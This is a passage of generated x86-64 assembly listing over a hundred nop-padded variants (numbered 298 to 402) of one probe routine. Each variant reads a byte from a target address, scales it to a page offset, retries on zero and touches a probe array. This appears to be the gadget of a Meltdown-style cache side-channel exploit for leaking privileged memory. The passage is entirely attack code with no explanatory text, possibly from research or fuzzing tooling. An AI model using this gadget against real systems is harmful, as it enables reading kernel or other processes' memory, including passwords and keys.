	movq	(%rcx, %rax, 1), %rbx
	nop
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 298
.Lprobe_one_win0_var298:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	nop
	nop
	nop
	nop
	shlq	$0xc, %rax
	jz	92b
	nop
	nop
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 299
.Lprobe_one_win0_var299:
	popq	%rax
	addq	$32, %rsp
	nop
	nop
	movb	(%rdx), %al
	nop
	nop
	shlq	$0xc, %rax
	nop
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 300
.Lprobe_one_win0_var300:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	nop
	shlq	$0xc, %rax
	nop
	nop
	nop
	nop
	jz	92b
	nop
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 301
.Lprobe_one_win0_var301:
	popq	%rax
	addq	$32, %rsp
	nop
	movb	(%rdx), %al
	nop
	nop
	nop
	nop
	nop
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 302
.Lprobe_one_win0_var302:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	nop
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	nop
	nop
	nop
	nop
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 303
.Lprobe_one_win0_var303:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	nop
	nop
	nop
	nop
	shlq	$0xc, %rax
	nop
	jz	92b
	nop
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 304
.Lprobe_one_win0_var304:
	popq	%rax
	addq	$32, %rsp
	nop
	nop
	nop
	nop
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	nop
	movq	(%rcx, %rax, 1), %rbx
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 305
.Lprobe_one_win0_var305:
	popq	%rax
	addq	$32, %rsp
	nop
	nop
	nop
	nop
	nop
	movb	(%rdx), %al
	shlq	$0xc, %rax
	nop
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 306
.Lprobe_one_win0_var306:
	popq	%rax
	addq	$32, %rsp
	nop
	nop
	nop
	movb	(%rdx), %al
	shlq	$0xc, %rax
	nop
	nop
	nop
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 307
.Lprobe_one_win0_var307:
	popq	%rax
	addq	$32, %rsp
	nop
	movb	(%rdx), %al
	nop
	nop
	nop
	nop
	nop
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 308
.Lprobe_one_win0_var308:
	popq	%rax
	addq	$32, %rsp
	nop
	movb	(%rdx), %al
	shlq	$0xc, %rax
	nop
	nop
	nop
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	nop
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 309
.Lprobe_one_win0_var309:
	popq	%rax
	addq	$32, %rsp
	nop
	movb	(%rdx), %al
	nop
	nop
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	nop
	nop
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 310
.Lprobe_one_win0_var310:
	popq	%rax
	addq	$32, %rsp
	nop
	nop
	movb	(%rdx), %al
	nop
	shlq	$0xc, %rax
	jz	92b
	nop
	movq	(%rcx, %rax, 1), %rbx
	nop
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 311
.Lprobe_one_win0_var311:
	popq	%rax
	addq	$32, %rsp
	nop
	nop
	movb	(%rdx), %al
	nop
	shlq	$0xc, %rax
	nop
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	nop
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 312
.Lprobe_one_win0_var312:
	popq	%rax
	addq	$32, %rsp
	nop
	nop
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	nop
	nop
	movq	(%rcx, %rax, 1), %rbx
	nop
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 313
.Lprobe_one_win0_var313:
	popq	%rax
	addq	$32, %rsp
	nop
	nop
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	nop
	nop
	movq	(%rcx, %rax, 1), %rbx
	nop
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 314
.Lprobe_one_win0_var314:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	nop
	nop
	nop
	shlq	$0xc, %rax
	jz	92b
	nop
	movq	(%rcx, %rax, 1), %rbx
	nop
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 315
.Lprobe_one_win0_var315:
	popq	%rax
	addq	$32, %rsp
	nop
	nop
	nop
	movb	(%rdx), %al
	nop
	shlq	$0xc, %rax
	jz	92b
	nop
	nop
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 316
.Lprobe_one_win0_var316:
	popq	%rax
	addq	$32, %rsp
	nop
	movb	(%rdx), %al
	nop
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	nop
	nop
	nop
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 317
.Lprobe_one_win0_var317:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	nop
	nop
	shlq	$0xc, %rax
	jz	92b
	nop
	nop
	nop
	movq	(%rcx, %rax, 1), %rbx
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 318
.Lprobe_one_win0_var318:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	nop
	nop
	shlq	$0xc, %rax
	nop
	jz	92b
	nop
	nop
	nop
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 319
.Lprobe_one_win0_var319:
	popq	%rax
	addq	$32, %rsp
	nop
	nop
	movb	(%rdx), %al
	nop
	nop
	shlq	$0xc, %rax
	nop
	jz	92b
	nop
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 320
.Lprobe_one_win0_var320:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	nop
	nop
	nop
	shlq	$0xc, %rax
	jz	92b
	nop
	movq	(%rcx, %rax, 1), %rbx
	nop
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 321
.Lprobe_one_win0_var321:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	nop
	nop
	shlq	$0xc, %rax
	nop
	nop
	nop
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 322
.Lprobe_one_win0_var322:
	popq	%rax
	addq	$32, %rsp
	nop
	movb	(%rdx), %al
	shlq	$0xc, %rax
	nop
	jz	92b
	nop
	movq	(%rcx, %rax, 1), %rbx
	nop
	nop
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 323
.Lprobe_one_win0_var323:
	popq	%rax
	addq	$32, %rsp
	nop
	nop
	movb	(%rdx), %al
	nop
	shlq	$0xc, %rax
	jz	92b
	nop
	nop
	nop
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 324
.Lprobe_one_win0_var324:
	popq	%rax
	addq	$32, %rsp
	nop
	nop
	movb	(%rdx), %al
	shlq	$0xc, %rax
	nop
	nop
	nop
	jz	92b
	nop
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 325
.Lprobe_one_win0_var325:
	popq	%rax
	addq	$32, %rsp
	nop
	nop
	nop
	movb	(%rdx), %al
	shlq	$0xc, %rax
	nop
	jz	92b
	nop
	movq	(%rcx, %rax, 1), %rbx
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 326
.Lprobe_one_win0_var326:
	popq	%rax
	addq	$32, %rsp
	nop
	nop
	movb	(%rdx), %al
	nop
	nop
	nop
	shlq	$0xc, %rax
	nop
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 327
.Lprobe_one_win0_var327:
	popq	%rax
	addq	$32, %rsp
	nop
	nop
	nop
	nop
	movb	(%rdx), %al
	shlq	$0xc, %rax
	nop
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 328
.Lprobe_one_win0_var328:
	popq	%rax
	addq	$32, %rsp
	nop
	nop
	nop
	nop
	movb	(%rdx), %al
	shlq	$0xc, %rax
	nop
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 329
.Lprobe_one_win0_var329:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	nop
	nop
	nop
	shlq	$0xc, %rax
	jz	92b
	nop
	movq	(%rcx, %rax, 1), %rbx
	nop
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 330
.Lprobe_one_win0_var330:
	popq	%rax
	addq	$32, %rsp
	nop
	movb	(%rdx), %al
	shlq	$0xc, %rax
	nop
	jz	92b
	nop
	nop
	movq	(%rcx, %rax, 1), %rbx
	nop
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 331
.Lprobe_one_win0_var331:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	nop
	nop
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	nop
	nop
	nop
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 332
.Lprobe_one_win0_var332:
	popq	%rax
	addq	$32, %rsp
	nop
	nop
	movb	(%rdx), %al
	shlq	$0xc, %rax
	nop
	nop
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	nop
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 333
.Lprobe_one_win0_var333:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	nop
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	nop
	nop
	nop
	nop
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 334
.Lprobe_one_win0_var334:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	nop
	nop
	shlq	$0xc, %rax
	jz	92b
	nop
	movq	(%rcx, %rax, 1), %rbx
	nop
	nop
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 335
.Lprobe_one_win0_var335:
	popq	%rax
	addq	$32, %rsp
	nop
	nop
	nop
	nop
	movb	(%rdx), %al
	shlq	$0xc, %rax
	nop
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 336
.Lprobe_one_win0_var336:
	popq	%rax
	addq	$32, %rsp
	nop
	nop
	nop
	nop
	nop
	movb	(%rdx), %al
	nop
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 337
.Lprobe_one_win0_var337:
	popq	%rax
	addq	$32, %rsp
	nop
	movb	(%rdx), %al
	nop
	nop
	nop
	nop
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 338
.Lprobe_one_win0_var338:
	popq	%rax
	addq	$32, %rsp
	nop
	nop
	movb	(%rdx), %al
	nop
	shlq	$0xc, %rax
	nop
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	nop
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 339
.Lprobe_one_win0_var339:
	popq	%rax
	addq	$32, %rsp
	nop
	nop
	nop
	movb	(%rdx), %al
	shlq	$0xc, %rax
	nop
	nop
	nop
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 340
.Lprobe_one_win0_var340:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	nop
	nop
	nop
	nop
	shlq	$0xc, %rax
	jz	92b
	nop
	nop
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 341
.Lprobe_one_win0_var341:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	nop
	nop
	nop
	movq	(%rcx, %rax, 1), %rbx
	nop
	nop
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 342
.Lprobe_one_win0_var342:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	nop
	nop
	jz	92b
	nop
	movq	(%rcx, %rax, 1), %rbx
	nop
	nop
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 343
.Lprobe_one_win0_var343:
	popq	%rax
	addq	$32, %rsp
	nop
	movb	(%rdx), %al
	nop
	nop
	nop
	shlq	$0xc, %rax
	nop
	nop
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 344
.Lprobe_one_win0_var344:
	popq	%rax
	addq	$32, %rsp
	nop
	movb	(%rdx), %al
	shlq	$0xc, %rax
	nop
	nop
	nop
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	nop
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 345
.Lprobe_one_win0_var345:
	popq	%rax
	addq	$32, %rsp
	nop
	nop
	movb	(%rdx), %al
	nop
	nop
	shlq	$0xc, %rax
	nop
	nop
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 346
.Lprobe_one_win0_var346:
	popq	%rax
	addq	$32, %rsp
	nop
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	nop
	nop
	movq	(%rcx, %rax, 1), %rbx
	nop
	nop
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 347
.Lprobe_one_win0_var347:
	popq	%rax
	addq	$32, %rsp
	nop
	nop
	nop
	nop
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	nop
	movq	(%rcx, %rax, 1), %rbx
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 348
.Lprobe_one_win0_var348:
	popq	%rax
	addq	$32, %rsp
	nop
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	nop
	nop
	nop
	nop
	nop
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 349
.Lprobe_one_win0_var349:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	nop
	nop
	nop
	shlq	$0xc, %rax
	nop
	jz	92b
	nop
	nop
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 350
.Lprobe_one_win0_var350:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	nop
	nop
	nop
	nop
	nop
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 351
.Lprobe_one_win0_var351:
	popq	%rax
	addq	$32, %rsp
	nop
	movb	(%rdx), %al
	nop
	nop
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	nop
	nop
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 352
.Lprobe_one_win0_var352:
	popq	%rax
	addq	$32, %rsp
	nop
	movb	(%rdx), %al
	nop
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	nop
	nop
	nop
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 353
.Lprobe_one_win0_var353:
	popq	%rax
	addq	$32, %rsp
	nop
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	nop
	nop
	nop
	movq	(%rcx, %rax, 1), %rbx
	nop
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 354
.Lprobe_one_win0_var354:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	nop
	shlq	$0xc, %rax
	jz	92b
	nop
	nop
	movq	(%rcx, %rax, 1), %rbx
	nop
	nop
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 355
.Lprobe_one_win0_var355:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	nop
	nop
	nop
	nop
	shlq	$0xc, %rax
	jz	92b
	nop
	movq	(%rcx, %rax, 1), %rbx
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 356
.Lprobe_one_win0_var356:
	popq	%rax
	addq	$32, %rsp
	nop
	movb	(%rdx), %al
	nop
	nop
	nop
	nop
	nop
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 357
.Lprobe_one_win0_var357:
	popq	%rax
	addq	$32, %rsp
	nop
	movb	(%rdx), %al
	nop
	nop
	nop
	nop
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 358
.Lprobe_one_win0_var358:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	nop
	nop
	nop
	shlq	$0xc, %rax
	nop
	jz	92b
	nop
	movq	(%rcx, %rax, 1), %rbx
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 359
.Lprobe_one_win0_var359:
	popq	%rax
	addq	$32, %rsp
	nop
	nop
	movb	(%rdx), %al
	nop
	shlq	$0xc, %rax
	nop
	nop
	nop
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 360
.Lprobe_one_win0_var360:
	popq	%rax
	addq	$32, %rsp
	nop
	nop
	nop
	movb	(%rdx), %al
	nop
	nop
	nop
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 361
.Lprobe_one_win0_var361:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	nop
	shlq	$0xc, %rax
	nop
	nop
	nop
	nop
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 362
.Lprobe_one_win0_var362:
	popq	%rax
	addq	$32, %rsp
	nop
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	nop
	nop
	nop
	nop
	nop
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 363
.Lprobe_one_win0_var363:
	popq	%rax
	addq	$32, %rsp
	nop
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	nop
	movq	(%rcx, %rax, 1), %rbx
	nop
	nop
	nop
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 364
.Lprobe_one_win0_var364:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	nop
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	nop
	nop
	nop
	nop
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 365
.Lprobe_one_win0_var365:
	popq	%rax
	addq	$32, %rsp
	nop
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	nop
	nop
	nop
	movq	(%rcx, %rax, 1), %rbx
	nop
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 366
.Lprobe_one_win0_var366:
	popq	%rax
	addq	$32, %rsp
	nop
	movb	(%rdx), %al
	nop
	nop
	nop
	nop
	shlq	$0xc, %rax
	nop
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 367
.Lprobe_one_win0_var367:
	popq	%rax
	addq	$32, %rsp
	nop
	movb	(%rdx), %al
	nop
	nop
	shlq	$0xc, %rax
	nop
	nop
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 368
.Lprobe_one_win0_var368:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	nop
	shlq	$0xc, %rax
	jz	92b
	nop
	nop
	nop
	movq	(%rcx, %rax, 1), %rbx
	nop
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 369
.Lprobe_one_win0_var369:
	popq	%rax
	addq	$32, %rsp
	nop
	nop
	nop
	movb	(%rdx), %al
	nop
	shlq	$0xc, %rax
	nop
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 370
.Lprobe_one_win0_var370:
	popq	%rax
	addq	$32, %rsp
	nop
	movb	(%rdx), %al
	nop
	nop
	shlq	$0xc, %rax
	nop
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	nop
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 371
.Lprobe_one_win0_var371:
	popq	%rax
	addq	$32, %rsp
	nop
	nop
	movb	(%rdx), %al
	shlq	$0xc, %rax
	nop
	nop
	nop
	nop
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 372
.Lprobe_one_win0_var372:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	nop
	shlq	$0xc, %rax
	nop
	jz	92b
	nop
	movq	(%rcx, %rax, 1), %rbx
	nop
	nop
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 373
.Lprobe_one_win0_var373:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	nop
	nop
	shlq	$0xc, %rax
	nop
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	nop
	nop
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 374
.Lprobe_one_win0_var374:
	popq	%rax
	addq	$32, %rsp
	nop
	nop
	movb	(%rdx), %al
	nop
	shlq	$0xc, %rax
	jz	92b
	nop
	movq	(%rcx, %rax, 1), %rbx
	nop
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 375
.Lprobe_one_win0_var375:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	nop
	shlq	$0xc, %rax
	jz	92b
	nop
	nop
	nop
	movq	(%rcx, %rax, 1), %rbx
	nop
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 376
.Lprobe_one_win0_var376:
	popq	%rax
	addq	$32, %rsp
	nop
	nop
	nop
	nop
	nop
	movb	(%rdx), %al
	shlq	$0xc, %rax
	nop
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 377
.Lprobe_one_win0_var377:
	popq	%rax
	addq	$32, %rsp
	nop
	nop
	nop
	movb	(%rdx), %al
	shlq	$0xc, %rax
	nop
	jz	92b
	nop
	nop
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 378
.Lprobe_one_win0_var378:
	popq	%rax
	addq	$32, %rsp
	nop
	nop
	nop
	movb	(%rdx), %al
	nop
	nop
	shlq	$0xc, %rax
	jz	92b
	nop
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 379
.Lprobe_one_win0_var379:
	popq	%rax
	addq	$32, %rsp
	nop
	movb	(%rdx), %al
	nop
	nop
	nop
	nop
	shlq	$0xc, %rax
	nop
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 380
.Lprobe_one_win0_var380:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	nop
	nop
	nop
	nop
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	nop
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 381
.Lprobe_one_win0_var381:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	nop
	shlq	$0xc, %rax
	nop
	jz	92b
	nop
	nop
	nop
	movq	(%rcx, %rax, 1), %rbx
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 382
.Lprobe_one_win0_var382:
	popq	%rax
	addq	$32, %rsp
	nop
	nop
	nop
	nop
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	nop
	nop
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 383
.Lprobe_one_win0_var383:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	nop
	nop
	nop
	nop
	shlq	$0xc, %rax
	nop
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 384
.Lprobe_one_win0_var384:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	nop
	nop
	nop
	nop
	shlq	$0xc, %rax
	nop
	nop
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 385
.Lprobe_one_win0_var385:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	nop
	shlq	$0xc, %rax
	nop
	nop
	nop
	nop
	nop
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 386
.Lprobe_one_win0_var386:
	popq	%rax
	addq	$32, %rsp
	nop
	nop
	nop
	nop
	movb	(%rdx), %al
	nop
	shlq	$0xc, %rax
	nop
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 387
.Lprobe_one_win0_var387:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	nop
	shlq	$0xc, %rax
	jz	92b
	nop
	movq	(%rcx, %rax, 1), %rbx
	nop
	nop
	nop
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 388
.Lprobe_one_win0_var388:
	popq	%rax
	addq	$32, %rsp
	nop
	movb	(%rdx), %al
	nop
	shlq	$0xc, %rax
	nop
	jz	92b
	nop
	nop
	movq	(%rcx, %rax, 1), %rbx
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 389
.Lprobe_one_win0_var389:
	popq	%rax
	addq	$32, %rsp
	nop
	movb	(%rdx), %al
	shlq	$0xc, %rax
	nop
	jz	92b
	nop
	nop
	nop
	movq	(%rcx, %rax, 1), %rbx
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 390
.Lprobe_one_win0_var390:
	popq	%rax
	addq	$32, %rsp
	nop
	nop
	nop
	movb	(%rdx), %al
	nop
	nop
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 391
.Lprobe_one_win0_var391:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	nop
	nop
	nop
	shlq	$0xc, %rax
	nop
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	nop
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 392
.Lprobe_one_win0_var392:
	popq	%rax
	addq	$32, %rsp
	nop
	nop
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	nop
	nop
	nop
	nop
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 393
.Lprobe_one_win0_var393:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	nop
	nop
	jz	92b
	nop
	nop
	nop
	nop
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 394
.Lprobe_one_win0_var394:
	popq	%rax
	addq	$32, %rsp
	nop
	nop
	movb	(%rdx), %al
	shlq	$0xc, %rax
	nop
	jz	92b
	nop
	nop
	nop
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 395
.Lprobe_one_win0_var395:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	nop
	nop
	shlq	$0xc, %rax
	nop
	jz	92b
	nop
	movq	(%rcx, %rax, 1), %rbx
	nop
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 396
.Lprobe_one_win0_var396:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	nop
	nop
	shlq	$0xc, %rax
	nop
	nop
	jz	92b
	nop
	nop
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 397
.Lprobe_one_win0_var397:
	popq	%rax
	addq	$32, %rsp
	nop
	movb	(%rdx), %al
	shlq	$0xc, %rax
	nop
	nop
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	nop
	nop
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 398
.Lprobe_one_win0_var398:
	popq	%rax
	addq	$32, %rsp
	nop
	nop
	movb	(%rdx), %al
	shlq	$0xc, %rax
	nop
	nop
	jz	92b
	nop
	movq	(%rcx, %rax, 1), %rbx
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 399
.Lprobe_one_win0_var399:
	popq	%rax
	addq	$32, %rsp
	nop
	nop
	movb	(%rdx), %al
	nop
	nop
	shlq	$0xc, %rax
	jz	92b
	nop
	nop
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 400
.Lprobe_one_win0_var400:
	popq	%rax
	addq	$32, %rsp
	nop
	nop
	nop
	movb	(%rdx), %al
	nop
	shlq	$0xc, %rax
	nop
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 401
.Lprobe_one_win0_var401:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	nop
	nop
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	nop
	nop
	nop
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 402
.Lprobe_one_win0_var402:
	popq	%rax
	addq	$32, %rsp
	nop
	nop
	nop
	movb	(%rdx), %al
	nop
